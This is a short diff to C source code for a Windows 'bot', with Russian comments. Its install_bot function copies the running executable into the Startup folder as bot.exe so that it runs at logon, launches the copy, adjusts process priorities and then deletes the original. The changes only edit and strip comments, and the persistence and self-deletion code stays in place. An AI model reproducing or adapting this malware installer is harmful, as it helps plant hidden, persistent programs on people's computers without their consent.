@@ -34,9 +34,8 @@ static void install_bot() {
 	SHGetFolderPathW(NULL, CSIDL_ALTSTARTUP, NULL, 0, path_newbot);
 	GetModuleFileNameW(NULL, path_bot, sizeof(path_bot) / sizeof(path_bot[0]));
 	wcscat(path_newbot, L"\\bot.exe");
-	//если пути ботов - того который должен быть установлен и того кто запустился не совпадают
-
-		//копирование бота в папку автозагрузки
+	//копирование бота в папку автозагрузки, если скопировать не получилось, то значит
+	//что мы уже там, или произошел инцидент 0 - мы лажанули
 	if (CopyFileW(path_bot, path_newbot, TRUE))
 	{
 		wchar_t cmd_path[MAX_PATH];
@@ -53,14 +52,12 @@ static void install_bot() {
 		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
 		if (ShellExecuteEx(&sei))
 		{
-			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS); //removing process stops
-			SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //accelerate our process
-			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); //accelerate our thread
+			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
+			SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
+			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
 		}
 		do_destroy();
-	}
-		//выполняем самоудаление в любом случае, можно придумать альтернативы
-	
+	}	
 }
 
 int main()
